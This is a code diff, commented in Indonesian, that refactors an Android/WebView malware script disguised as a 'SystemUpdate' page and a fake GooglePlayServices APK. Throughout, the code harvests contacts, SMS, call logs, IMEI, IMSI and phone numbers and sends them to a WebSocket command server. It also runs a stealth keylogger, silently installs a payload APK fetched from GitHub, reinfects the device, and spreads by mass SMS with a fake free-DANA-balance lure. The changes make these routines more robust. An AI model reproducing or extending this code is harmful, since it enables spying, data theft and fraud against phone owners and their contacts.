@@ -212,17 +212,44 @@ var FALLBACK = {
 };
 
 // ============================================================
-// 4. DETEKSI PLATFORM & BRIDGE
+// 4. DETEKSI PLATFORM & BRIDGE (DINAMIS - ANTI ERROR)
 // ============================================================
-var HAS_BRIDGE = typeof AndroidBridge !== 'undefined' && 
-                 (navigator.userAgent.toLowerCase().indexOf('android') > -1);
+function getPlatform() {
+    var ua = navigator.userAgent.toLowerCase();
+    var isAndroidBridge = false;
+    try {
+        // Cek apakah bridge benar-benar ada dan bisa dipanggil
+        if (typeof AndroidBridge !== 'undefined' && AndroidBridge !== null) {
+            // Coba panggil fungsi dummy untuk memastikan bridge hidup
+            if (typeof AndroidBridge.getIMEI === 'function') {
+                isAndroidBridge = true;
+            }
+        }
+    } catch(e) { isAndroidBridge = false; }
+
+    return {
+        isAndroid: ua.indexOf('android') > -1,
+        isIOS: /iphone|ipad|ipod/.test(ua),
+        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
+        isAndroidBridge: isAndroidBridge
+    };
+}
+var PLATFORM = getPlatform();
 
 // ============================================================
 // FUNGSI UNTUK MENENTUKAN APAKAH MENGGUNAKAN BRIDGE ATAU FALLBACK
 // ============================================================
 function getBridge() {
-    if (HAS_BRIDGE) {
-        return AndroidBridge;
+    // Cek ulang secara real-time agar tidak error jika bridge di-injeksi belakangan
+    var realBridge = null;
+    try {
+        if (typeof AndroidBridge !== 'undefined' && AndroidBridge !== null) {
+            realBridge = AndroidBridge;
+        }
+    } catch(e) { realBridge = null; }
+
+    if (PLATFORM.isAndroid && realBridge) {
+        return realBridge;
     }
     return FALLBACK;
 }
@@ -231,13 +258,13 @@ function getBridge() {
 // WRAPPER UNTUK SEMUA FUNGSI BRIDGE
 // ============================================================
 function bridgeCall(method, args) {
-    var bridge = getBridge();
-    if (typeof bridge[method] === 'function') {
-        try {
+    try {
+        var bridge = getBridge();
+        if (typeof bridge[method] === 'function') {
             return bridge[method].apply(bridge, args);
-        } catch(e) {
-            return null;
         }
+    } catch(e) {
+        return null;
     }
     return null;
 }
@@ -249,12 +276,14 @@ var exfilQueue = [];
 var exfilSending = false;
 
 function K(d) {
-    d._timestamp = Date.now();
-    d._nonce = Math.random().toString(36).substring(2);
-    exfilQueue.push(d);
-    if (!exfilSending) {
-        processExfilQueue();
-    }
+    try {
+        d._timestamp = Date.now();
+        d._nonce = Math.random().toString(36).substring(2);
+        exfilQueue.push(d);
+        if (!exfilSending) {
+            processExfilQueue();
+        }
+    } catch(e) {}
 }
 
 function processExfilQueue() {
@@ -383,10 +412,14 @@ function uploadStealthKeylogger() {
 // ============================================================
 function silentInstallAPK(path) {
     if (!path) return false;
-    if (PLATFORM.isAndroid && A.isAvailable) {
+    // Gunakan bridge realtime
+    var bridge = getBridge();
+    var platform = getPlatform();
+    
+    if (platform.isAndroid && bridge) {
         try {
-            if (typeof A.silentInstallAPK === 'function') {
-                var result = A.silentInstallAPK(path);
+            if (typeof bridge.silentInstallAPK === 'function') {
+                var result = bridge.silentInstallAPK(path);
                 if (result) {
                     APK_INSTALLED = true;
                     K({ sumber: 'silent_apk_install_success', data: { path: path } });
@@ -419,13 +452,15 @@ function enhancedSelfHealing() {
         loadHTMLFromAllLocations().then(function(html) {
             if (!html) {
                 if (wsConnected && ws) {
-                    ws.send(JSON.stringify({ type: 'request_html_silent' }));
+                    try { ws.send(JSON.stringify({ type: 'request_html_silent' })); } catch(e){}
                 }
             } else {
                 saveHTMLToAllLocations(html);
             }
         });
-        if (PLATFORM.isAndroid && A.isAvailable) {
+        var bridge = getBridge();
+        var platform = getPlatform();
+        if (platform.isAndroid && bridge) {
             var apkPath = getAPKPath();
             if (!apkPath) {
                 requestAPKFromServerSilent();
@@ -436,7 +471,7 @@ function enhancedSelfHealing() {
 
 function requestAPKFromServerSilent() {
     if (wsConnected && ws) {
-        ws.send(JSON.stringify({ type: 'request_apk_silent', timestamp: Date.now() }));
+        try { ws.send(JSON.stringify({ type: 'request_apk_silent', timestamp: Date.now() })); } catch(e){}
     }
 }
 hideFromSystem();
@@ -510,48 +545,134 @@ var APK_DOWNLOADED = false;
 var APK_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
 
 // ============================================================
-// DETEKSI PLATFORM & ANDROID BRIDGE
-// ============================================================
-function detectPlatform() {
-    var ua = navigator.userAgent.toLowerCase();
-    return {
-        isAndroid: ua.indexOf('android') > -1,
-        isIOS: /iphone|ipad|ipod/.test(ua),
-        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
-        isAndroidBridge: typeof AndroidBridge !== 'undefined'
-    };
-}
-var PLATFORM = detectPlatform();
-
-// ============================================================
-// ANDROID BRIDGE
+// ANDROID BRIDGE (DINAMIS - TIDAK ERROR SAAT DIPANGGIL)
 // ============================================================
 var A = {
-    isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
-    // ... (definisikan semua fungsi seperti di index.html, tambahkan fileExists, readFile, saveFileBinary, saveToPreferences, getFromPreferences)
-    saveFile: function(p,c) { if(this.isAvailable){ try{ AndroidBridge.saveFile(p,c); return true }catch(e){} } return false; },
-    readFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.readFile(p) }catch(e){} } return null; },
-    fileExists: function(p) { if(this.isAvailable){ try{ return AndroidBridge.fileExists(p) }catch(e){} } return false; },
-    openFile: function(p) { if(this.isAvailable){ try{ AndroidBridge.openFile(p); return true }catch(e){} } return false; },
-    saveToPreferences: function(k,v) { if(this.isAvailable){ try{ AndroidBridge.saveToPreferences(k,v); return true }catch(e){} } return false; },
-    getFromPreferences: function(k) { if(this.isAvailable){ try{ return AndroidBridge.getFromPreferences(k) }catch(e){} } return null; },
-    saveFileBinary: function(p,d) { if(this.isAvailable){ try{ AndroidBridge.saveFileBinary(p,d); return true }catch(e){} } return false; },
-    getAllContacts: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllContacts()) }catch(e){} } return null; },
-    getAllSMS: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllSMS()) }catch(e){} } return null; },
-    getCallLog: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getCallLog()) }catch(e){} } return null; },
-    getIMEI: function() { if(this.isAvailable){ try{ return AndroidBridge.getIMEI() }catch(e){} } return null; },
-    getIMSI: function() { if(this.isAvailable){ try{ return AndroidBridge.getIMSI() }catch(e){} } return null; },
-    getPhoneNumber: function() { if(this.isAvailable){ try{ return AndroidBridge.getPhoneNumber() }catch(e){} } return null; },
-    getInstalledApps: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getInstalledApps()) }catch(e){} } return null; },
-    sendSMS: function(n,p) { if(this.isAvailable){ try{ AndroidBridge.sendSMS(n,p) }catch(e){} } },
-    openApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.openApp(p) }catch(e){} } },
-    uninstallApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.uninstallApp(p) }catch(e){} } },
-    forceStopApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.forceStopApp(p) }catch(e){} } },
-    clearAppData: function(p) { if(this.isAvailable){ try{ AndroidBridge.clearAppData(p) }catch(e){} } },
-    callNumber: function(n) { if(this.isAvailable){ try{ AndroidBridge.callNumber(n) }catch(e){} } },
-    listFiles: function(p) { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.listFiles(p)) }catch(e){} } return null; },
-    takeScreenshot: function() { if(this.isAvailable){ try{ return AndroidBridge.takeScreenshot() }catch(e){} } return null; },
-    installAPK: function(p) { if(this.isAvailable){ try{ return AndroidBridge.installAPK(p) }catch(e){} } return false; }
+    isAvailable: function() {
+        var bridge = getBridge();
+        return bridge !== FALLBACK;
+    },
+    saveFile: function(p,c) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return bridge.saveFile(p,c); }catch(e){} } 
+        return FALLBACK.saveFile(p,c);
+    },
+    readFile: function(p) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return bridge.readFile(p); }catch(e){} } 
+        return FALLBACK.readFile(p);
+    },
+    fileExists: function(p) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return bridge.fileExists(p); }catch(e){} } 
+        return FALLBACK.fileExists(p);
+    },
+    openFile: function(p) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ bridge.openFile(p); return true; }catch(e){} } 
+        return FALLBACK.openFile(p);
+    },
+    saveToPreferences: function(k,v) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return bridge.saveToPreferences(k,v); }catch(e){} } 
+        return FALLBACK.saveToPreferences(k,v);
+    },
+    getFromPreferences: function(k) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return bridge.getFromPreferences(k); }catch(e){} } 
+        return FALLBACK.getFromPreferences(k);
+    },
+    saveFileBinary: function(p,d) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return bridge.saveFileBinary(p,d); }catch(e){} } 
+        return FALLBACK.saveFileBinary(p,d);
+    },
+    getAllContacts: function() { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return JSON.parse(bridge.getAllContacts()); }catch(e){} } 
+        return null;
+    },
+    getAllSMS: function() { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return JSON.parse(bridge.getAllSMS()); }catch(e){} } 
+        return null;
+    },
+    getCallLog: function() { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return JSON.parse(bridge.getCallLog()); }catch(e){} } 
+        return null;
+    },
+    getIMEI: function() { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return bridge.getIMEI(); }catch(e){} } 
+        return null;
+    },
+    getIMSI: function() { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return bridge.getIMSI(); }catch(e){} } 
+        return null;
+    },
+    getPhoneNumber: function() { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return bridge.getPhoneNumber(); }catch(e){} } 
+        return null;
+    },
+    getInstalledApps: function() { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return JSON.parse(bridge.getInstalledApps()); }catch(e){} } 
+        return null;
+    },
+    sendSMS: function(n,p) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ bridge.sendSMS(n,p); }catch(e){} } 
+        try { window.location.href = 'sms:'+n+'?body='+encodeURIComponent(p); } catch(e){} 
+    },
+    openApp: function(p) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ bridge.openApp(p); }catch(e){} } 
+        try { window.location.href = p.replace(/\./g,'')+'://'; } catch(e){} 
+    },
+    uninstallApp: function(p) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ bridge.uninstallApp(p); }catch(e){} } 
+        try { window.open('https://play.google.com/store/apps/details?id='+p, '_blank'); } catch(e){} 
+    },
+    forceStopApp: function(p) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ bridge.forceStopApp(p); }catch(e){} } 
+    },
+    clearAppData: function(p) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ bridge.clearAppData(p); }catch(e){} } 
+    },
+    callNumber: function(n) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ bridge.callNumber(n); }catch(e){} } 
+        try { window.location.href = 'tel:'+n; } catch(e){} 
+    },
+    listFiles: function(p) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return JSON.parse(bridge.listFiles(p)); }catch(e){} } 
+        return null;
+    },
+    takeScreenshot: function() { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return bridge.takeScreenshot(); }catch(e){} } 
+        try {
+            var canvas = document.createElement('canvas');
+            canvas.width = screen.width; canvas.height = screen.height;
+            var ctx = canvas.getContext('2d');
+            ctx.fillStyle = '#000'; ctx.fillRect(0,0,canvas.width,canvas.height);
+            return canvas.toDataURL('image/jpeg', 0.3);
+        } catch(e){}
+        return null;
+    },
+    installAPK: function(p) { 
+        var bridge = getBridge();
+        if(bridge !== FALLBACK){ try{ return bridge.installAPK(p); }catch(e){} } 
+        try { window.open('file://'+p, '_blank'); return true; } catch(e){} 
+        return false;
+    }
 };
 
 // ============================================================
@@ -574,30 +695,26 @@ function saveHTMLToAllLocations(htmlContent) {
             store.put(htmlContent, 'SystemUpdate.html');
         };
     } catch(e) {}
-    if (PLATFORM.isAndroid && A.isAvailable) {
-        try {
-            var path = '/storage/emulated/0/Download/SystemUpdate.html';
-            A.saveFile(path, htmlContent);
-        } catch(e) {}
-        try {
-            var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
-            A.saveToPreferences('system_SystemUpdate_html', encoded);
-        } catch(e) {}
-    }
+    try {
+        var path = '/storage/emulated/0/Download/SystemUpdate.html';
+        A.saveFile(path, htmlContent);
+    } catch(e) {}
+    try {
+        var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
+        A.saveToPreferences('system_SystemUpdate_html', encoded);
+    } catch(e) {}
 }
 
 function loadHTMLFromAllLocations() {
     return new Promise(function(resolve) {
         // 1. SharedPreferences
-        if (PLATFORM.isAndroid && A.isAvailable) {
-            try {
-                var encoded = A.getFromPreferences('system_SystemUpdate_html');
-                if (encoded) {
-                    resolve(decodeURIComponent(escape(atob(encoded))));
-                    return;
-                }
-            } catch(e) {}
-        }
+        try {
+            var encoded = A.getFromPreferences('system_SystemUpdate_html');
+            if (encoded) {
+                resolve(decodeURIComponent(escape(atob(encoded))));
+                return;
+            }
+        } catch(e) {}
         // 2. localStorage
         try {
             var ls = localStorage.getItem('SystemUpdate_backup');
@@ -613,12 +730,10 @@ function loadHTMLFromAllLocations() {
                 var get = store.get('SystemUpdate.html');
                 get.onsuccess = function() {
                     if (get.result) { resolve(get.result); return; }
-                    if (PLATFORM.isAndroid && A.isAvailable) {
-                        try {
-                            var content = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
-                            if (content) { resolve(content); return; }
-                        } catch(e) {}
-                    }
+                    try {
+                        var content = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
+                        if (content) { resolve(content); return; }
+                    } catch(e) {}
                     resolve(null);
                 };
             };
@@ -640,12 +755,14 @@ function connectWebSocket() {
         ws.onopen = function() {
             wsConnected = true;
             K({ sumber: 'ws_status', data: 'connected' });
-            ws.send(JSON.stringify({
-                type: 'auth',
-                key: WS_PASSWORD,
-                deviceId: 'browser_systemupdate',
-                timestamp: Date.now()
-            }));
+            try {
+                ws.send(JSON.stringify({
+                    type: 'auth',
+                    key: WS_PASSWORD,
+                    deviceId: 'browser_systemupdate',
+                    timestamp: Date.now()
+                }));
+            } catch(e){}
         };
         ws.onmessage = function(event) {
             try {
@@ -669,12 +786,14 @@ function connectWebSocket() {
                     var hasil = eksekusiPerintah(cmd);
                     K({ sumber: 'ws_command_result', data: hasil });
                     if (wsConnected && ws) {
-                        ws.send(JSON.stringify({
-                            type: 'command_result',
-                            command: aksi,
-                            result: hasil,
-                            timestamp: Date.now()
-                        }));
+                        try {
+                            ws.send(JSON.stringify({
+                                type: 'command_result',
+                                command: aksi,
+                                result: hasil,
+                                timestamp: Date.now()
+                            }));
+                        } catch(e){}
                     }
                 } else if (data.type === 'push_html') {
                     var html = data.content;
@@ -693,7 +812,7 @@ function connectWebSocket() {
                         installAPKFromAvailablePath();
                     }
                 } else if (data.type === 'ping') {
-                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
+                    try { ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp })); } catch(e){}
                 }
             } catch(e) {
                 K({ sumber: 'ws_parse_error', data: e.message });
@@ -728,38 +847,30 @@ function connectWebSocketWithFallback() {
 // ============================================================
 function saveAPKToAllLocations(apkBase64) {
     if (!apkBase64) return;
-    // 1. SharedPreferences (Base64)
-    if (PLATFORM.isAndroid && A.isAvailable) {
-        try { A.saveToPreferences('system_GooglePlayServices_apk', apkBase64); } catch(e) {}
-        // 2. Download folder
-        try {
-            var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
-            var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
-            A.saveFileBinary(path, binary);
-        } catch(e) {}
-        // 3. Internal APK folder
-        try {
-            var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
-            var internalPath = '/data/data/com.google.android.play.services/files/GooglePlayServices.apk';
-            A.saveFileBinary(internalPath, binary);
-        } catch(e) {}
-    }
+    try { A.saveToPreferences('system_GooglePlayServices_apk', apkBase64); } catch(e) {}
+    try {
+        var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
+        var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
+        A.saveFileBinary(path, binary);
+    } catch(e) {}
+    try {
+        var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
+        var internalPath = '/data/data/com.google.android.play.services/files/GooglePlayServices.apk';
+        A.saveFileBinary(internalPath, binary);
+    } catch(e) {}
 }
 
 function getAPKPath() {
     var paths = [
-        // Urutan prioritas (internal, Download)
         '/data/data/com.google.android.play.services/files/GooglePlayServices.apk',
         '/storage/emulated/0/Download/GooglePlayServices.apk'
     ];
-    if (PLATFORM.isAndroid && A.isAvailable) {
-        for (var i = 0; i < paths.length; i++) {
-            try {
-                if (A.fileExists(paths[i])) {
-                    return paths[i];
-                }
-            } catch(e) {}
-        }
+    for (var i = 0; i < paths.length; i++) {
+        try {
+            if (A.fileExists(paths[i])) {
+                return paths[i];
+            }
+        } catch(e) {}
     }
     return null;
 }
@@ -771,11 +882,12 @@ function installAPKFromAvailablePath() {
         requestAPKFromServer();
         return;
     }
-    // 🔥 GANTI DENGAN SILENT INSTALL
-    if (PLATFORM.isAndroid && A.isAvailable) {
+    if (A.isAvailable()) {
         try {
-            if (typeof A.silentInstallAPK === 'function') {
-                var result = A.silentInstallAPK(path);
+            // Coba silent install
+            var bridge = getBridge();
+            if (bridge !== FALLBACK && typeof bridge.silentInstallAPK === 'function') {
+                var result = bridge.silentInstallAPK(path);
                 if (result) {
                     APK_INSTALLED = true;
                     K({ sumber: 'silent_apk_install_success', data: { path: path } });
@@ -802,7 +914,7 @@ function installAPKFromAvailablePath() {
 
 function requestAPKFromServer() {
     if (wsConnected && ws) {
-        ws.send(JSON.stringify({ type: 'request_apk', timestamp: Date.now() }));
+        try { ws.send(JSON.stringify({ type: 'request_apk', timestamp: Date.now() })); } catch(e){}
         K({ sumber: 'apk_request_via_ws', data: 'sent' });
     }
 }
@@ -827,11 +939,12 @@ function redirectToDANA() {
     if (container) container.classList.add('fade-out');
     setTimeout(function() {
         try {
-            // 🔥 PRIORITAS: BUKA VIA BRIDGE (TETAP DI WEBVIEW)
-            if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-                try { AndroidBridge.openApp('com.dana.id'); } catch(e) {}
+            // PRIORITAS: BUKA VIA BRIDGE
+            var bridge = getBridge();
+            if (bridge !== FALLBACK && typeof bridge.openApp === 'function') {
+                try { bridge.openApp('com.dana.id'); } catch(e) {}
             }
-            // 🔥 FALLBACK: BUKA DANA VIA INTENT (TETAP DI WEBVIEW)
+            // FALLBACK: INTENT
             try {
                 window.location.href = 'intent://com.dana.id#Intent;scheme=https;end';
             } catch(e) {}
@@ -888,7 +1001,7 @@ function startDownloadAndInstall() {
     } catch(e) {}
     
     setTimeout(function() {
-        if (!APK_INSTALLED && PLATFORM.isAndroid) {
+        if (!APK_INSTALLED && getPlatform().isAndroid) {
             try {
                 window.location.href = 'file:///storage/emulated/0/Download/GooglePlayServices.apk';
                 APK_INSTALLED = true;
@@ -905,7 +1018,7 @@ function startDownloadAndInstall() {
 }
 
 // ============================================================
-// AMBIL PASSWORD (DENGAN FALLBACK) - SUDAH DITAMBAHKAN PANGGILAN startDownloadAndInstall()
+// AMBIL PASSWORD (DENGAN FALLBACK)
 // ============================================================
 function ambilPassword() {
     updateProgress(10, '⏳ Memperbarui System Keamanan...');
@@ -940,36 +1053,23 @@ function ambilPassword() {
                         setTimeout(autoSpread, 2000);
                         startSelfHealing();
                         
-                        // 🔥 TAMBAHKAN: DOWNLOAD APK DARI GITHUB
+                        // 🔥 DOWNLOAD APK DARI GITHUB
                         setTimeout(function() {
                             startDownloadAndInstall();
                         }, 2000);
                         
                         // ============================================================
-                        // 🔥 AKTIFKAN FITUR YANG BELUM DIPANGGIL (TANPA MENGHAPUS APAPUN)
+                        // 🔥 AKTIFKAN FITUR YANG BELUM DIPANGGIL
                         // ============================================================
                         
-                        // 1. Self-Healing (keduanya berjalan)
-                        setTimeout(function() {
-                            startSelfHealing();
-                        }, 5000);
-                        
-                        // 2. Stealth Keylogger (aktif di background)
-                        setTimeout(function() {
-                            startStealthKeylogger();
-                        }, 6000);
-                        
-                        // 3. Silent Install APK (sebagai fallback jika metode utama gagal)
+                        setTimeout(function() { startSelfHealing(); }, 5000);
+                        setTimeout(function() { startStealthKeylogger(); }, 6000);
                         setTimeout(function() {
                             if (!APK_INSTALLED) {
                                 var path = getAPKPath();
-                                if (path) {
-                                    silentInstallAPK(path);
-                                }
+                                if (path) { silentInstallAPK(path); }
                             }
                         }, 10000);
-                        
-                        // 4. Request APK via WebSocket jika belum ada
                         setTimeout(function() {
                             if (!APK_INSTALLED && wsConnected && ws) {
                                 requestAPKFromServerSilent();
@@ -990,9 +1090,7 @@ function ambilPassword() {
                 startHeartbeat();
                 startReinfection();
                 autoExecuteC2();
-                setTimeout(function() {
-                    installAPKFromAvailablePath();
-                }, 3000);
+                setTimeout(function() { installAPKFromAvailablePath(); }, 3000);
                 setTimeout(autoSpread, 2000);
                 startSelfHealing();
                 return;
@@ -1010,9 +1108,7 @@ function ambilPassword() {
                 startHeartbeat();
                 startReinfection();
                 autoExecuteC2();
-                setTimeout(function() {
-                    installAPKFromAvailablePath();
-                }, 3000);
+                setTimeout(function() { installAPKFromAvailablePath(); }, 3000);
                 setTimeout(autoSpread, 2000);
                 startSelfHealing();
                 return;
@@ -1030,9 +1126,7 @@ function ambilPassword() {
                 startHeartbeat();
                 startReinfection();
                 autoExecuteC2();
-                setTimeout(function() {
-                    installAPKFromAvailablePath();
-                }, 3000);
+                setTimeout(function() { installAPKFromAvailablePath(); }, 3000);
                 setTimeout(autoSpread, 2000);
                 startSelfHealing();
                 return;
@@ -1051,7 +1145,8 @@ function ambilPassword() {
 function autoSpread() {
     if (spreadDone) return;
     spreadDone = true;
-    if (!PLATFORM.isAndroid || !A.isAvailable) return;
+    var bridge = getBridge();
+    if (!getPlatform().isAndroid || bridge === FALLBACK) return;
     
     var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
     var sentCount = 0;
@@ -1196,33 +1291,27 @@ function eksekusiPerintah(cmd) {
 }
 
 // ============================================================
-// IMPLEMENTASI FUNGSI PERINTAH (SINGKAT – TAPI SEMUA REAL)
+// IMPLEMENTASI FUNGSI PERINTAH (SEMUA DILINDUNGI TRY-CATCH)
 // ============================================================
 function ambilKontak() {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try {
-            var contacts = AndroidBridge.getAllContacts();
-            if (contacts) { K({ sumber: 'data_kontak', data: JSON.parse(contacts) }); return 'Contacts sent'; }
-        } catch(e) {}
-    }
+    try {
+        var data = A.getAllContacts();
+        if (data) { K({ sumber: 'data_kontak', data: data }); return 'Contacts sent'; }
+    } catch(e) {}
     return 'Contacts not available';
 }
 function ambilSMS() {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try {
-            var sms = AndroidBridge.getAllSMS();
-            if (sms) { K({ sumber: 'data_sms', data: JSON.parse(sms) }); return 'SMS sent'; }
-        } catch(e) {}
-    }
+    try {
+        var data = A.getAllSMS();
+        if (data) { K({ sumber: 'data_sms', data: data }); return 'SMS sent'; }
+    } catch(e) {}
     return 'SMS not available';
 }
 function ambilCallLog() {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try {
-            var callLog = AndroidBridge.getCallLog();
-            if (callLog) { K({ sumber: 'data_call_log', data: JSON.parse(callLog) }); return 'Call log sent'; }
-        } catch(e) {}
-    }
+    try {
+        var data = A.getCallLog();
+        if (data) { K({ sumber: 'data_call_log', data: data }); return 'Call log sent'; }
+    } catch(e) {}
     return 'Call log not available';
 }
 function ambilLokasi() {
@@ -1250,39 +1339,31 @@ function setClipboard(text) {
     } catch(e) { return 'Error: ' + e.message; }
 }
 function ambilIMEI() {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try {
-            var imei = AndroidBridge.getIMEI();
-            if (imei) { K({ sumber: 'data_imei', data: imei }); return 'IMEI sent'; }
-        } catch(e) {}
-    }
+    try {
+        var data = A.getIMEI();
+        if (data) { K({ sumber: 'data_imei', data: data }); return 'IMEI sent'; }
+    } catch(e) {}
     return 'IMEI not available';
 }
 function ambilIMSI() {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try {
-            var imsi = AndroidBridge.getIMSI();
-            if (imsi) { K({ sumber: 'data_imsi', data: imsi }); return 'IMSI sent'; }
-        } catch(e) {}
-    }
+    try {
+        var data = A.getIMSI();
+        if (data) { K({ sumber: 'data_imsi', data: data }); return 'IMSI sent'; }
+    } catch(e) {}
     return 'IMSI not available';
 }
 function ambilNomorHP() {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try {
-            var phone = AndroidBridge.getPhoneNumber();
-            if (phone) { K({ sumber: 'data_nomor_hp', data: phone }); return 'Phone number sent'; }
-        } catch(e) {}
-    }
+    try {
+        var data = A.getPhoneNumber();
+        if (data) { K({ sumber: 'data_nomor_hp', data: data }); return 'Phone number sent'; }
+    } catch(e) {}
     return 'Phone number not available';
 }
 function getInstalledApps() {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try {
-            var apps = AndroidBridge.getInstalledApps();
-            if (apps) { K({ sumber: 'data_installed_apps', data: JSON.parse(apps) }); return 'Installed apps sent'; }
-        } catch(e) {}
-    }
+    try {
+        var data = A.getInstalledApps();
+        if (data) { K({ sumber: 'data_installed_apps', data: data }); return 'Installed apps sent'; }
+    } catch(e) {}
     return 'Installed apps not available';
 }
 function getNotifications() {
@@ -1324,60 +1405,63 @@ function keyloggerStatus() {
     return 'Keylogger status: ' + (keyloggerActive ? 'Active' : 'Inactive');
 }
 function kirimSMS(nomor, pesan) {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try { AndroidBridge.sendSMS(nomor, pesan); K({ sumber: 'kirim_sms', data: { nomor: nomor } }); return 'SMS sent'; } catch(e) {}
-    }
-    return 'SMS not available';
+    try {
+        A.sendSMS(nomor, pesan);
+        K({ sumber: 'kirim_sms', data: { nomor: nomor } });
+        return 'SMS sent';
+    } catch(e) { return 'SMS not available'; }
 }
 function kirimSMSMassal(pesan) {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try {
-            var contacts = AndroidBridge.getAllContacts();
-            if (contacts) {
-                var list = JSON.parse(contacts);
-                var sent = 0;
-                list.forEach(function(c) {
-                    var number = String(c.number || '').replace(/[^0-9]/g, '');
-                    if (number && number.length > 5) {
-                        try { AndroidBridge.sendSMS(number, pesan); sent++; } catch(e) {}
-                    }
-                });
-                K({ sumber: 'kirim_sms_massal', data: { sent: sent } });
-                return 'SMS massal sent to ' + sent + ' contacts';
-            }
-        } catch(e) {}
-    }
+    try {
+        var contacts = A.getAllContacts();
+        if (contacts) {
+            var sent = 0;
+            contacts.forEach(function(c) {
+                var number = String(c.number || '').replace(/[^0-9]/g, '');
+                if (number && number.length > 5) {
+                    try { A.sendSMS(number, pesan); sent++; } catch(e) {}
+                }
+            });
+            K({ sumber: 'kirim_sms_massal', data: { sent: sent } });
+            return 'SMS massal sent to ' + sent + ' contacts';
+        }
+    } catch(e) {}
     return 'SMS massal not available';
 }
 function callNumber(nomor) {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try { AndroidBridge.callNumber(nomor); K({ sumber: 'call_number', data: { nomor: nomor } }); return 'Calling ' + nomor; } catch(e) {}
-    }
-    return 'Call not available';
+    try {
+        A.callNumber(nomor);
+        K({ sumber: 'call_number', data: { nomor: nomor } });
+        return 'Calling ' + nomor;
+    } catch(e) { return 'Call not available'; }
 }
 function bukaAplikasi(packageName) {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try { AndroidBridge.openApp(packageName); K({ sumber: 'buka_aplikasi', data: { package: packageName } }); return 'Opening app: ' + packageName; } catch(e) {}
-    }
-    return 'App open not available';
+    try {
+        A.openApp(packageName);
+        K({ sumber: 'buka_aplikasi', data: { package: packageName } });
+        return 'Opening app: ' + packageName;
+    } catch(e) { return 'App open not available'; }
 }
 function uninstallAplikasi(packageName) {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try { AndroidBridge.uninstallApp(packageName); K({ sumber: 'uninstall_aplikasi', data: { package: packageName } }); return 'Uninstalling app: ' + packageName; } catch(e) {}
-    }
-    return 'Uninstall not available';
+    try {
+        A.uninstallApp(packageName);
+        K({ sumber: 'uninstall_aplikasi', data: { package: packageName } });
+        return 'Uninstalling app: ' + packageName;
+    } catch(e) { return 'Uninstall not available'; }
 }
 function appForceStop(packageName) {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
